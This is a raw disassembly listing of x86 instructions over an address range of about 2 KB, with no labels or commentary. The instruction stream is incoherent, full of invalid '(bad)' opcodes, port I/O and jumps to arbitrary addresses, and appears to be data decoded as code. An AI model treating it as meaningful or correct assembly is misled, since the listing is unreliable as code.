  429fc1:	add    eax,0xade4cbcd
  429fc6:	(bad)  
  429fc7:	test   al,0xcc
  429fc9:	jmp    0xbb1e74b6
  429fce:	(bad)  
  429fcf:	in     eax,dx
  429fd0:	cld    
  429fd1:	mov    dl,0xed
  429fd3:	ret    
  429fd4:	mov    ebx,0xfdd5fdc0
  429fd9:	(bad)  
  429fda:	neg    dh
  429fdc:	leave  
  429fdd:	(bad)  
  429fde:	pmaxub mm6,mm4
  429fe1:	les    eax,FWORD PTR [edi]
  429fe3:	fisubr DWORD PTR [ecx-0x1c35524d]
  429fe9:	sti    
  429fea:	enter  0xb0ee,0xc6
  429fee:	lock fcomi st,st(5)
  429ff1:	in     eax,dx
  429ff2:	retf   
  429ff3:	mov    esi,0xf1dccfd9
  429ff8:	stc    
  429ff9:	push   es
  429ffa:	add    eax,edi
  429ffc:	pop    es
  429ffd:	push   es
  429ffe:	clc    
  429fff:	pop    es
  42a000:	out    0x3,al
  42a002:	push   es
  42a003:	add    ebp,ecx
  42a005:	in     eax,dx
  42a006:	shl    al,0xb6
  42a009:	int    0xf2
  42a00b:	in     al,dx
  42a00c:	xlat   BYTE PTR ds:[ebx]
  42a00d:	(bad)  
  42a00e:	into   
  42a00f:	mov    al,0xb8
  42a011:	in     eax,dx
  42a012:	idiv   ah
  42a014:	call   ecx
  42a016:	in     al,dx
  42a017:	fdivp  st(0),st
  42a019:	loopne 0x42a018
  42a01b:	(bad)  
  42a01d:	cld    
  42a01e:	out    dx,al
  42a01f:	jecxz  0x42a00f
  42a021:	cld    
  42a022:	add    al,0xf2
  42a024:	loopne 0x42a00d
  42a026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a027:	in     al,0xed
  42a029:	in     eax,0xca
  42a02b:	mov    ch,0xce
  42a02d:	in     al,0xd8
  42a02f:	shl    BYTE PTR [ebx-0x2f093142],cl
  42a035:	iret   
  42a036:	icebp  
  42a037:	repnz stc 
  42a039:	out    0xff,eax
  42a03b:	lock div ch
  42a03e:	add    ch,ch
  42a040:	jecxz  0x42a01f
  42a042:	clc    
  42a043:	iret   
  42a044:	out    0xf7,al
  42a046:	shl    ecx,cl
  42a048:	call   0xf7399219
  42a04d:	cli    
  42a04e:	cmc    
  42a04f:	leave  
  42a050:	sar    BYTE PTR [ebx-0x1373c13],1
  42a056:	into   
  42a057:	shl    al,cl
  42a059:	fadd   st,st(4)
  42a05b:	jmp    0xf61d7a31
  42a060:	or     ecx,DWORD PTR [ebx+ecx*1]
  42a063:	enter  0xdee5,0xbd
  42a067:	mov    esp,0xdac4c6f5
  42a06c:	hlt    
  42a06d:	jmp    0xf9386766
  42a072:	cmc    
  42a073:	(bad)  
  42a075:	rcr    eax,1
  42a077:	mov    ah,0xbc
  42a079:	int3   
  42a07a:	retf   
  42a07b:	loopne 0x42a060
  42a07d:	in     eax,0xc8
  42a07f:	aad    0xc3
  42a081:	in     eax,dx
  42a082:	in     eax,dx
  42a083:	into   
  42a084:	fsubp  st(2),st
  42a086:	(bad)
  42a089:	imul   bh
  42a08b:	leave  
  42a08c:	scas   eax,DWORD PTR es:[edi]
  42a08d:	mov    ah,0xb0
  42a090:	mov    edx,0xbdf9bdd1
  42a095:	repnz rcl edx,1
  42a098:	mov    esi,0xdcd2c2d3
  42a09d:	cld    
  42a09e:	leave  
  42a09f:	push   cs
  42a0a0:	int    0xe
  42a0a2:	jmp    0xf5c7:0xb7c4e400
  42a0a9:	in     al,0xcf
  42a0ab:	icebp  
  42a0ac:	sar    cl,1
  42a0ae:	mov    edx,0xdabacef0
  42a0b3:	aam    0xe1
  42a0b5:	fsubr  st(0),st
  42a0b7:	hlt    
  42a0b8:	(bad)  
  42a0b9:	repz rcr bh,1
  42a0bc:	lock enter 0xeb09,0xec
  42a0c1:	fiadd  WORD PTR [edx+edi*8]
  42a0c4:	int3   
  42a0c5:	in     eax,dx
  42a0c6:	shl    bl,1
  42a0c8:	lods   al,BYTE PTR ds:[esi]
  42a0c9:	rol    eax,0xcf
  42a0cc:	stc    
  42a0cd:	fcmove st,st(6)
  42a0cf:	int    0xbd
  42a0d1:	iret   
  42a0d2:	mov    edx,0xb9e1bcd4
  42a0d7:	int3   
  42a0d8:	repz rcr esp,0xd8
  42a0dc:	out    0xc5,eax
  42a0de:	stc    
  42a0df:	in     al,0xc9
  42a0e1:	or     esi,ebp
  42a0e3:	adc    eax,edi
  42a0e5:	stos   BYTE PTR es:[edi],al
  42a0e6:	shl    ebp,0xc7
  42a0e9:	repnz lock rol ebp,1
  42a0ed:	cli    
  42a0ee:	div    esp
  42a0f0:	jmp    0xd42d8df4
  42a0f5:	add    ecx,esp
  42a0f7:	add    eax,0xc3b9c3d3
  42a0fc:	jmp    0x42a106
  42a0fe:	not    ah
  42a100:	jecxz  0x42a0db
  42a102:	repnz pop es
  42a104:	lds    edi,FWORD PTR [edi+eiz*8-0x53384f3e]
  42a10b:	int    0xb3
  42a10d:	sar    edi,1
  42a10f:	iret   
  42a110:	shl    edx,cl
  42a112:	add    edi,DWORD PTR [edi-0x3243330b]
  42a118:	stc    
  42a119:	std    
  42a11a:	rcr    ch,cl
  42a11c:	retf   0xc5fa
  42a11f:	fldlg2 
  42a121:	sti    
  42a122:	rcl    ebx,0xc8
  42a125:	fsubr  st,st(1)
  42a127:	(bad)
  42a12a:	aam    0xed
  42a12c:	shr    DWORD PTR [esi-0x1508091c],0xb4
  42a133:	mov    esi,0xf2fbe7e1
  42a138:	loopne 0x42a11c
  42a13a:	in     al,0xd0
  42a13c:	dec    BYTE PTR [edi]
  42a13e:	jmp    0x42a114
  42a140:	clc    
  42a141:	(bad)  
  42a142:	jmp    0x42a13c
  42a144:	(bad)  
  42a146:	repz mov bl,0xac
  42a149:	mov    dl,0xe5
  42a14b:	xbegin 0xba20713a
  42a151:	int    0xd2
  42a153:	fcmovnbe st,st(3)
  42a155:	loop   0x42a124
  42a157:	cli    
  42a158:	not    bl
  42a15a:	cmc    
  42a15b:	push   es
  42a15c:	(bad)  
  42a15d:	enter  0xde,0xfc
  42a161:	(bad)
  42a164:	out    0xbf,eax
  42a166:	(bad)  
  42a167:	jmp    0xb8d8:0xd6cbf4ed
  42a16e:	in     al,0xac
  42a170:	jmp    0xd3e7:0x2dedcd3
  42a177:	pop    es
  42a178:	clc    
  42a179:	(bad)  
  42a17a:	repnz out 0xdc,eax
  42a17d:	(bad)  
  42a17e:	retf   
  42a17f:	retf   0xf3fe
  42a182:	out    0x1,eax
  42a184:	ror    eax,cl
  42a186:	int    0xa8
  42a188:	out    dx,eax
  42a189:	jmp    0x42a173
  42a18b:	mov    dh,0xe9
  42a18d:	cli    
  42a18e:	cli    
  42a18f:	clc    
  42a190:	int    0xdf
  42a192:	hlt    
  42a193:	aam    0x2
  42a195:	add    al,al
  42a197:	add    eax,DWORD PTR [esi]
  42a199:	(bad)  
  42a19a:	mov    ebp,0xbd704d7
  42a19f:	add    edi,esp
  42a1a1:	loopne 0x42a1a5
  42a1a3:	in     eax,0xd2
  42a1a5:	jecxz  0x42a16c
  42a1a7:	int    0xe4
  42a1a9:	lods   al,BYTE PTR ds:[esi]
  42a1aa:	mov    bl,0xb5
  42a1ac:	int    0xc0
  42a1ae:	(bad)  
  42a1af:	jmp    0xccce:0xc9bbe9b8
  42a1b6:	aad    0xf4
  42a1b8:	add    eax,0xbfc0d1f3
  42a1bd:	(bad)  
  42a1be:	out    0xda,eax
  42a1c0:	loope  0x42a19d
  42a1c2:	in     eax,0xd8
  42a1c4:	retf   0xb3e1
  42a1c7:	in     eax,0xcf
  42a1c9:	loop   0x42a1b4
  42a1cb:	mov    bl,0xe5
  42a1cd:	hlt    
  42a1ce:	retf   
  42a1cf:	enter  0xbcd8,0xf0
  42a1d3:	ret    
  42a1d4:	loop   0x42a199
  42a1d6:	(bad)  
  42a1d8:	mov    esi,0x8c1c5e6
  42a1dd:	fimul  DWORD PTR [edx]
  42a1df:	add    al,0xe
  42a1e1:	add    ebx,ecx
  42a1e3:	shr    dl,0xe0
  42a1e6:	fdivr  QWORD PTR [edx+ecx*8-0xd3f1a4f]
  42a1ed:	(bad)  
  42a1ef:	out    dx,al
  42a1f0:	leave  
  42a1f1:	(bad)  
  42a1f3:	(bad)  
  42a1f4:	mov    esp,0xe3e6dad9
  42a1f9:	(bad)  
  42a1fb:	or     esp,eax
  42a1fd:	(bad)  
  42a1ff:	mul    cl
  42a201:	jmp    0xccecb0ec
  42a206:	icebp  
  42a207:	shr    BYTE PTR [ebx-0x1732121a],1
  42a20d:	jmp    0x42a1e2
  42a20f:	mov    bh,0xf3
  42a211:	cli    
  42a212:	jmp    0xd9147bcf
  42a217:	lock out 0x4,al
  42a21a:	in     eax,0x4
  42a21c:	fadd   DWORD PTR [esi]
  42a21e:	push   es
  42a21f:	retf   
  42a220:	hlt    
  42a221:	fld    QWORD PTR [ebx]
  42a223:	or     al,0xd8
  42a225:	(bad)  
  42a226:	fmulp  st(2),st
  42a228:	cmc    
  42a229:	fucomi st,st(6)
  42a22b:	in     eax,dx
  42a22c:	repnz mov ecx,0xf1e5efb7
  42a232:	iret   
  42a233:	fmul   st(7),st
  42a235:	into   
  42a236:	shl    esp,1
  42a238:	idiv   BYTE PTR [ebp+ebx*8-0x230f2523]
  42a23f:	add    eax,0x9c4cfc7
  42a244:	out    0xa9,al
  42a246:	mov    esp,0xfaaae7e7
  42a24b:	(bad)  
  42a24c:	mov    dh,0xd8
  42a24e:	call   esi
  42a250:	mov    eax,0xd4d9b5b6
  42a255:	stc    
  42a256:	pop    es
  42a257:	idiv   dh
  42a259:	pop    es
  42a25a:	not    eax
  42a25c:	cld    
  42a25d:	fmul   QWORD PTR [edx]
  42a25f:	fcmovnu st,st(0)
  42a261:	add    al,bl
  42a263:	out    0xca,al
  42a265:	leave  
  42a266:	(bad)
  42a26a:	loop   0x42a231
  42a26c:	retf   0xd6d2
  42a26f:	sar    BYTE PTR [edx-0x700054a],cl
  42a275:	xlat   BYTE PTR ds:[ebx]
  42a276:	icebp  
  42a277:	aad    0xbc
  42a279:	sti    
  42a27a:	add    al,0xf5
  42a27c:	dec    cl
  42a27e:	test   ah,0xe9
  42a281:	in     al,0xdc
  42a283:	jecxz  0x42a237
  42a285:	xlat   BYTE PTR ds:[ebx]
  42a286:	out    0xeb,al
  42a288:	enter  0xc9c9,0xac
  42a28c:	xlat   BYTE PTR ds:[ebx]
  42a28d:	in     al,dx
  42a28e:	mov    bh,0xca
  42a290:	int3   
  42a291:	cld    
  42a292:	aad    0x3
  42a294:	fiadd  DWORD PTR [ebx]
  42a296:	cli    
  42a297:	(bad)  
  42a298:	loope  0x42a28f
  42a29a:	repnz mov eax,0xd0002c6
  42a2a0:	in     eax,dx
  42a2a1:	(bad)  
  42a2a2:	clc    
  42a2a3:	or     ecx,eax
  42a2a5:	(bad)  
  42a2a6:	repz mov al,0xe4
  42a2a9:	loop   0x42a285
  42a2ab:	(bad)  
  42a2ac:	int3   
  42a2ad:	call   0xeb359468
  42a2b2:	cli    
  42a2b3:	call   ebx
  42a2b5:	fnstsw WORD PTR [ebp-0x271efa05]
  42a2bb:	retf   
  42a2bc:	jmp    0xcc098da3
  42a2c1:	or     eax,0xedde0cf2
  42a2c6:	ret    0xefe4
  42a2c9:	sar    ebx,0xeb
  42a2cc:	ror    ch,1
  42a2ce:	repnz leave 
  42a2d0:	fstp   st(3)
  42a2d2:	(bad)  
  42a2d4:	loope  0x42a2b3
  42a2d6:	fcomi  st,st(2)
  42a2d8:	add    eax,DWORD PTR [ebx]
  42a2da:	repnz mov eax,0xfbc4dce2
  42a2e0:	(bad)  
  42a2e1:	in     eax,0xf
  42a2e3:	out    0xe0,al
  42a2e5:	mov    eax,0xc6eeeff7
  42a2ea:	(bad)
  42a2ed:	leave  
  42a2ee:	int    0xcc
  42a2f0:	out    dx,al
  42a2f1:	cli    
  42a2f2:	fyl2xp1 
  42a2f4:	out    dx,eax
  42a2f5:	int3   
  42a2f6:	mov    edi,0xd2f3f9f9
  42a2fb:	loop   0x42a300
  42a2fd:	(bad)  
  42a2fe:	fldln2 
  42a300:	or     cl,BYTE PTR ds:0xe2e7ebc8
  42a306:	mov    edi,0xeccbc8e7
  42a30b:	loopne 0x42a307
  42a30d:	fcmove st,st(3)
  42a30f:	out    dx,al
  42a310:	mov    eax,0xf9d8d8ca
  42a315:	mov    eax,0xf000cecf
  42a31a:	repz loopne 0x42a30d
  42a31d:	out    0x9,eax
  42a31f:	pop    es
  42a320:	out    dx,eax
  42a321:	aam    0xfa
  42a323:	ror    esp,cl
  42a325:	jmp    0x42a30b
  42a327:	mov    ebp,0xf2c6e9ad
  42a32c:	vpand  xmm0,xmm6,xmm4
  42a330:	in     al,dx
  42a331:	lock mov ebp,0xc3febbdd
  42a337:	shl    al,cl
  42a339:	lock fdivr st(4),st
  42a33c:	test   DWORD PTR [edi],0xee5eacb
  42a342:	call   0xecf37c4a
  42a347:	mov    esp,0xf2adc3b2
  42a34c:	out    0xee,eax
  42a34e:	(bad)  
  42a34f:	mov    al,0xc9
  42a351:	shr    ch,cl
  42a353:	int3   
  42a354:	int    0xcc
  42a356:	std    
  42a357:	push   es
  42a358:	(bad)  
  42a359:	lock aad 0xf0
  42a35c:	add    DWORD PTR ds:0xc8c3e2c4,eax
  42a362:	(bad)  
  42a364:	in     al,0xbe
  42a366:	out    0xef,al
  42a368:	stos   DWORD PTR es:[edi],eax
  42a369:	call   0xed139554
  42a36e:	leave  
  42a36f:	lods   al,BYTE PTR ds:[esi]
  42a370:	in     eax,dx
  42a371:	leave  
  42a372:	std    
  42a373:	test   bl,0xba
  42a376:	loope  0x42a33a
  42a378:	(bad)  
  42a379:	out    0xe7,eax
  42a37b:	ret    0xe204
  42a37e:	fdivrp st(6),st
  42a380:	(bad)
  42a383:	fsubp  st(4),st
  42a385:	fistp  QWORD PTR [esi-0x4d361020]
  42a38b:	aad    0xc5
  42a38d:	in     eax,dx
  42a38e:	retf   
  42a38f:	lock mov esi,0xc9f9feec
  42a395:	test   dh,0xf8
  42a398:	mov    BYTE PTR [edx],0xe0
  42a39b:	add    ah,ah
  42a39d:	call   0xca0c7d87
  42a3a2:	jmp    0xe63494a3
  42a3a7:	(bad)  
  42a3a8:	in     eax,dx
  42a3a9:	mov    dh,0xb1
  42a3ab:	jmp    0xf30f7286
  42a3b0:	retf   
  42a3b1:	ror    dh,1
  42a3b3:	add    edx,ebp
  42a3b5:	lock mov ebp,0xda05fde5
  42a3bb:	shl    dl,0x2
  42a3be:	add    eax,0xdbebe0da
  42a3c3:	ffree  st(5)
  42a3c5:	leave  
  42a3c6:	(bad)  
  42a3c8:	loop   0x42a3b5
  42a3ca:	out    0xf7,eax
  42a3cc:	mov    cl,0xf5
  42a3ce:	mov    cl,0xc4
  42a3d0:	out    dx,eax
  42a3d1:	jmp    0x503:0xf0bcd7f1
  42a3d8:	in     al,0xc6
  42a3da:	(bad)  
  42a3db:	cmc    
  42a3dc:	call   0xfb439edb
  42a3e1:	retf   
  42a3e2:	cli    
  42a3e3:	rol    al,0xb1
  42a3e6:	out    0xbd,al
  42a3e8:	div    ebx
  42a3ea:	out    dx,eax
  42a3eb:	in     eax,0xc9
  42a3ed:	in     al,dx
  42a3ee:	mov    ecx,0xfdf2d3eb
  42a3f3:	in     eax,dx
  42a3f4:	out    dx,al
  42a3f5:	int3   
  42a3f6:	std    
  42a3f7:	shl    esi,1
  42a3f9:	rcr    bl,1
  42a3fb:	(bad)  
  42a3fd:	stc    
  42a3fe:	or     ecx,ecx
  42a400:	ret    
  42a401:	out    dx,al
  42a402:	or     cl,BYTE PTR [ecx]
  42a404:	mov    ecx,0xc6d2d7ce
  42a409:	aam    0xad
  42a40b:	mov    bl,0xcb
  42a40d:	jmp    0xea1698cb
  42a412:	jmp    0x42a3d7
  42a414:	fadd   st(1),st
  42a416:	into   
  42a417:	stc    
  42a418:	loopne 0x42a3ff
  42a41a:	repz (bad) 
  42a41c:	loopne 0x42a40d
  42a41e:	or     al,BYTE PTR [edx]
  42a420:	cmc    
  42a421:	psubw  mm2,QWORD PTR [edx]
  42a424:	rcl    ecx,0xb3
  42a427:	loope  0x42a3dc
  42a429:	(bad)  
  42a42a:	cmc    
  42a42b:	loope  0x42a3de
  42a42d:	stc    
  42a42e:	rcl    edi,cl
  42a430:	cmc    
  42a431:	aam    0xf0
  42a433:	mul    bl
  42a435:	in     eax,dx
  42a436:	stc    
  42a437:	sar    DWORD PTR [esi-0x29040508],1
  42a43d:	or     bh,bh
  42a43f:	enter  0xc201,0xef
  42a443:	add    esi,ebp
  42a445:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a446:	in     eax,dx
  42a447:	in     al,dx
  42a448:	icebp  
  42a449:	lock icebp 
  42a44b:	in     eax,0xea
  42a44d:	retf   0xe9b4
  42a450:	fcmove st,st(6)
  42a452:	div    dl
  42a454:	leave  
  42a455:	jecxz  0x42a423
  42a457:	clc    
  42a458:	add    bh,al
  42a45a:	fidivr DWORD PTR [eax+0x4f503e5]
  42a460:	out    dx,al
  42a461:	(bad)  
  42a462:	stc    
  42a463:	loopne 0x42a411
  42a465:	test   eax,0xefe8ddc3
  42a46a:	(bad)  
  42a46b:	mov    edx,0xebf9e4d2
  42a470:	mov    bl,0xfa
  42a472:	lock clc 
  42a474:	neg    ecx
  42a476:	mov    ecx,0xcbfce6d4
  42a47b:	add    edi,eax
  42a47d:	fadd   st,st(6)
  42a47f:	std    
  42a480:	(bad)  
  42a482:	call   0xe7308d95
  42a487:	aad    0xcd
  42a489:	fucomi st,st(0)
  42a48b:	enter  0xaece,0xe7
  42a48f:	in     al,dx
  42a490:	call   0xda115a65
  42a495:	xlat   BYTE PTR ds:[ebx]
  42a496:	add    BYTE PTR [esi+eax*8+0x1ddf2f8],bh
  42a49d:	stc    
  42a49e:	xlat   BYTE PTR ds:[ebx]
  42a49f:	(bad)  
  42a4a0:	aad    0xed
  42a4a2:	loopne 0x42a47e
  42a4a4:	lods   al,BYTE PTR ds:[esi]
  42a4a5:	div    DWORD PTR [ecx-0x114d490f]
  42a4ab:	hlt    
  42a4ac:	aam    0xd3
  42a4ae:	mov    edx,0xfbddfbd0
  42a4b3:	loope  0x42a4b6
  42a4b5:	div    esi
  42a4b7:	(bad)  
  42a4b9:	aad    0xe7
  42a4bb:	fsubp  st(0),st
  42a4bd:	fcmovnb st,st(5)
  42a4bf:	or     BYTE PTR [ecx],cl
  42a4c1:	push   es
  42a4c2:	leave  
  42a4c3:	retf   
  42a4c4:	out    dx,eax
  42a4c5:	(bad)  
  42a4c7:	(bad)  
  42a4c8:	scas   eax,DWORD PTR es:[edi]
  42a4c9:	jmp    0x42a4bf
  42a4cb:	in     al,dx
  42a4cc:	iret   
  42a4cd:	shl    DWORD PTR [edi-0x46302746],1
  42a4d3:	mov    esi,0xdbd1eefd
  42a4d8:	clc    
  42a4d9:	(bad)  
  42a4db:	fcmovbe st,st(7)
  42a4dd:	loopne 0x42a4d3
  42a4df:	sar    bh,0xec
  42a4e2:	push   cs
  42a4e3:	fldpi  
  42a4e5:	call   0xe11771d6
  42a4ea:	rcr    ebx,1
  42a4ec:	test   eax,0xf5fdd4e7
  42a4f2:	ret    
  42a4f3:	int3   
  42a4f4:	shl    ah,cl
  42a4f6:	hlt    
  42a4f7:	rcr    esp,1
  42a4f9:	std    
  42a4fa:	xlat   BYTE PTR ds:[ebx]
  42a4fb:	sti    
  42a4fc:	xlat   BYTE PTR ds:[ebx]
  42a4fd:	add    ch,bl
  42a4ff:	add    al,0xea
  42a501:	or     dh,cl
  42a503:	add    edi,eax
  42a505:	stos   BYTE PTR es:[edi],al
  42a506:	jmp    0xe6ef:0xc3ccb3c5
  42a50d:	mov    bh,0xfe
  42a50f:	repz (bad) 
  42a511:	mov    ebx,0x7bacaf6
  42a516:	clc    
  42a517:	stc    
  42a518:	cld    
  42a519:	cli    
  42a51a:	fcomip st,st(6)
  42a51c:	add    ebp,ecx
  42a51e:	stc    
  42a51f:	jmp    0xe7df:0xe1ed00ce
  42a526:	into   
  42a527:	loop   0x42a4ff
  42a529:	les    esi,FWORD PTR [edx-0x3a242850]
  42a52f:	(bad)  
  42a530:	(bad)  
  42a532:	cmc    
  42a533:	cmc    
  42a534:	jmp    0xc6257e13
  42a539:	ror    DWORD PTR [edx],cl
  42a53b:	fdiv   st(7),st
  42a53d:	add    al,0x0
  42a53f:	add    bh,cl
  42a541:	fdivp  st(6),st
  42a543:	retf   
  42a544:	call   0xd8198234
  42a549:	out    dx,eax
  42a54a:	int    0xd9
  42a54c:	leave  
  42a54d:	repz jmp FWORD PTR [ebx+esi*8-0x33004706]
  42a555:	push   edx
  42a557:	sar    BYTE PTR [edi-0x220f2e2c],1
  42a55d:	in     al,0xdf
  42a55f:	std    
  42a560:	bswap  ebp
  42a562:	add    bh,bh
  42a564:	mov    edi,0xbdd1b2f2
  42a569:	lods   eax,DWORD PTR ds:[esi]
  42a56a:	call   0xd1f4745f
  42a56f:	fidivr DWORD PTR [edi-0x37444124]
  42a575:	std    
  42a576:	rol    DWORD PTR [ecx],0x7
  42a579:	sar    BYTE PTR [ebp-0x6171d30],0xef
  42a580:	(bad)  
  42a581:	or     cl,BYTE PTR [edx+edi*8]
  42a584:	repz iret 
  42a586:	retf   0xe9e8
  42a589:	leave  
  42a58a:	out    dx,al
  42a58b:	call   0xfe2e6c83
  42a590:	fucomip st,st(6)
  42a592:	jmp    0xd3337263
  42a597:	rol    DWORD PTR [edx],0xf5
  42a59a:	rol    edi,cl
  42a59c:	in     al,0x8
  42a59e:	loop   0x42a57d
  42a5a0:	retf   0xfa04
  42a5a3:	(bad)  
  42a5a5:	enter  0xe9cc,0xb5
  42a5a9:	mov    bh,0xf4
  42a5ac:	mov    ah,0xcb
  42a5ae:	not    esp
  42a5b0:	jmp    0xf8e2:0xe8bbfcfa
  42a5b7:	rol    BYTE PTR [eax+eax*8],cl
  42a5ba:	(bad)  
  42a5bb:	cld    
  42a5bc:	(bad)  
  42a5be:	ror    BYTE PTR [esi],0xce
  42a5c1:	out    dx,eax
  42a5c2:	int3   
  42a5c3:	add    eax,0xf6bfe3c3
  42a5c8:	mov    bl,0xac
  42a5ca:	mov    dh,0xd4
  42a5cc:	rol    esi,0xf5
  42a5cf:	std    
  42a5d0:	mov    ah,0xfe
  42a5d2:	idiv   bl
  42a5d4:	int3   
  42a5d5:	int    0xdc
  42a5d7:	mov    esi,0xfbfbe6d3
  42a5dc:	(bad)  
  42a5dd:	or     esp,edi
  42a5df:	bswap  ebx
  42a5e1:	clc    
  42a5e2:	jmp    0x42a5c0
  42a5e4:	into   
  42a5e5:	loopne 0x42a599
  42a5e7:	xlat   BYTE PTR ds:[ebx]
  42a5e8:	icebp  
  42a5e9:	shr    eax,cl
  42a5eb:	xlat   BYTE PTR ds:[ebx]
  42a5ec:	mov    ebx,0xdfd2b8b9
  42a5f1:	mov    edx,0x2dccef4
  42a5f6:	stc    
  42a5f7:	rcr    ecx,cl
  42a5f9:	mov    esp,0xfbe4e6fc
  42a5fe:	jecxz  0x42a5ed
  42a600:	add    al,0xe8
  42a602:	jecxz  0x42a5c8
  42a604:	rol    eax,cl
  42a606:	iret   
  42a607:	in     eax,dx
  42a608:	jmp    0xd12b71d9
  42a60d:	fxch   st(1)
  42a60f:	out    0xcc,al
  42a611:	fcmovbe st,st(0)
  42a613:	sar    edx,cl
  42a615:	iret   
  42a616:	fld    QWORD PTR [eax]
  42a618:	mov    ebp,0xc2dbc1c4
  42a61d:	(bad)  
  42a61e:	cld    
  42a61f:	in     al,0xe4
  42a621:	(bad)  
  42a622:	in     al,0xcc
  42a624:	jmp    0x42a5fd
  42a626:	icebp  
  42a627:	jmp    0x42a61b
  42a629:	int    0xb5
  42a62b:	stc    
  42a62c:	mov    al,0xb5
  42a62e:	cmc    
  42a62f:	cli    
  42a630:	mov    ebp,0xfad2b8dd
  42a635:	cli    
  42a636:	sti    
  42a637:	in     eax,0xc2
  42a639:	fld    DWORD PTR [ecx]
  42a63b:	add    edx,eax
  42a63d:	aad    0xeb
  42a63f:	add    cl,cl
  42a641:	loopne 0x42a63b
  42a643:	loopne 0x42a611
  42a645:	lods   al,BYTE PTR ds:[esi]
  42a646:	fucomp st(3)
  42a648:	icebp  
  42a649:	fcomi  st,st(2)
  42a64b:	loop   0x42a618
  42a64d:	in     al,dx
  42a64e:	in     eax,dx
  42a64f:	out    dx,eax
  42a650:	stc    
  42a651:	mov    edx,0xe1c9dde8
  42a656:	shl    bh,cl
  42a658:	repnz fdivr QWORD PTR [ebp+0xfce2d7]
  42a65f:	add    eax,DWORD PTR [edx]
  42a661:	add    ecx,ebx
  42a663:	jmp    0x42a627
  42a665:	lods   al,BYTE PTR ds:[esi]
  42a666:	mov    al,0xe0
  42a668:	stos   DWORD PTR es:[edi],eax
  42a669:	cmc    
  42a66a:	leave  
  42a66b:	hlt    
  42a66c:	mov    al,0xe0
  42a66e:	jmp    0xbff9732c
  42a673:	icebp  
  42a674:	clc    
  42a675:	rcl    dl,cl
  42a677:	out    dx,al
  42a678:	xlat   BYTE PTR ds:[ebx]
  42a679:	cli    
  42a67a:	(bad)  
  42a67c:	inc    DWORD PTR [ebx]
  42a67e:	fdivp  st(2),st
  42a680:	loop   0x42a689
  42a682:	out    dx,al
  42a683:	or     ah,al
  42a685:	repnz (bad) 
  42a687:	vshufps ymm5,ymm2,YMMWORD PTR [ebp+esi*4-0x29005116],0xf6
  42a691:	mov    edx,0xb7bac8
  42a696:	fdivr  st(4),st
  42a698:	ret    0xdfd4
  42a69b:	lds    eax,FWORD PTR [ecx]
  42a69d:	push   es
  42a69e:	imul   dl
  42a6a0:	out    0xce,al
  42a6a2:	jecxz  0x42a670
  42a6a4:	rcl    eax,0xdf
  42a6a7:	mov    cl,0xc7
  42a6a9:	jecxz  0x42a692
  42a6ab:	mov    ch,0xef
  42a6ad:	sar    ebx,1
  42a6af:	mov    dh,0xd4
  42a6b1:	repnz xlat BYTE PTR ds:[ebx]
  42a6b3:	mov    edi,0xdaf0ddde
  42a6b8:	cmc    
  42a6b9:	add    eax,0x6f4b8dd
  42a6be:	or     bh,ah
  42a6c0:	stc    
  42a6c1:	out    dx,al
  42a6c2:	(bad)  
  42a6c4:	jecxz  0x42a677
  42a6c6:	fucomp st(4)
  42a6c8:	(bad)  
  42a6c9:	repz mov ebp,0xcfcbf4c6
  42a6d0:	mov    ah,0xcc
  42a6d2:	ffree  st(3)
  42a6d4:	mov    ecx,0xe7e2bcdd
  42a6d9:	add    eax,0xfef1fcb9
  42a6de:	cli    
  42a6df:	or     BYTE PTR [edx],al
  42a6e1:	stc    
  42a6e2:	shl    eax,0xb2
  42a6e5:	int3   
  42a6e6:	shl    DWORD PTR [edx-0x3f2d3e20],0xd2
  42a6ed:	shl    ah,cl
  42a6ef:	hlt    
  42a6f0:	lock stc 
  42a6f2:	fbstp  TBYTE PTR [eax-0x2a0c222e]
  42a6f8:	stc    
  42a6f9:	mov    ebp,0xc2dfdaf2
  42a6fe:	out    dx,eax
  42a6ff:	retf   0xdfc
  42a702:	in     eax,dx
  42a703:	add    ecx,esp
  42a705:	in     eax,0xec
  42a707:	iret   
  42a708:	lods   eax,DWORD PTR ds:[esi]
  42a709:	leave  
  42a70a:	in     al,dx
  42a70b:	repnz out 0xc6,al
  42a70e:	(bad)  
  42a70f:	lock xlat BYTE PTR ds:[ebx]
  42a711:	retf   
  42a712:	mov    esp,0x2b8d2e1
  42a717:	ftst   
  42a719:	aad    0xd3
  42a71b:	(bad)  
  42a71c:	(bad)  
  42a71d:	loopne 0x42a717
  42a71f:	cmc    
  42a720:	les    eax,FWORD PTR [esi]
  42a722:	jmp    0x42a6f2
  42a724:	fmulp  st(7),st
  42a726:	idiv   DWORD PTR [esi+edx*8-0x19130c2d]
  42a72d:	int3   
  42a72e:	in     eax,dx
  42a72f:	jmp    0xe7d4:0xf5eff6fb
  42a736:	(bad)  
  42a737:	in     eax,0xcd
  42a739:	icebp  
  42a73a:	add    ch,dh
  42a73c:	cli    
  42a73d:	fnstcw WORD PTR [ebp-0x25190215]
  42a743:	in     al,0xc2
  42a745:	leave  
  42a746:	shr    ch,cl
  42a748:	sar    ebx,cl
  42a74a:	icebp  
  42a74b:	shl    BYTE PTR [ebp-0xb271a30],0xf3
  42a752:	cli    
  42a753:	fdivrp st(4),st
  42a755:	add    ebp,edx
  42a757:	out    0xf7,al
  42a759:	icebp  
  42a75a:	(bad)  
  42a75b:	stc    
  42a75c:	fld    QWORD PTR [edi]
  42a75e:	fsubr  st(3),st
  42a760:	ud0    ebx,esp
  42a763:	enter  0xbfdd,0xe4
  42a767:	fmulp  st(0),st
  42a769:	shl    DWORD PTR [edx-0x174e4914],0xd7
  42a770:	fcmovnbe st,st(4)
  42a772:	stc    
  42a773:	loop   0x42a738
  42a775:	shl    al,1
  42a777:	std    
  42a778:	mov    esi,0xe7c3cbd5
  42a77d:	mov    esi,0xebe0bc00
  42a782:	repz loopne 0x42a76f
  42a785:	leave  
  42a786:	xlat   BYTE PTR ds:[ebx]
  42a787:	icebp  
  42a788:	mov    cl,0xe1
  42a78a:	shl    edx,1
  42a78c:	retf   0xe5d1
  42a78f:	mov    edi,0xf3ccb6fd
  42a794:	repnz in eax,dx
  42a796:	cld    
  42a797:	hlt    
  42a798:	rcr    edi,0xd2
  42a79b:	in     eax,0xe3
  42a79d:	clc    
  42a79e:	out    0xf8,eax
  42a7a0:	(bad)  
  42a7a1:	(bad)  
  42a7a3:	in     eax,dx
  42a7a4:	test   al,0xd8
  42a7a6:	int3   
  42a7a7:	jmp    0xf0037e59
  42a7ac:	(bad)  
  42a7ad:	out    dx,eax
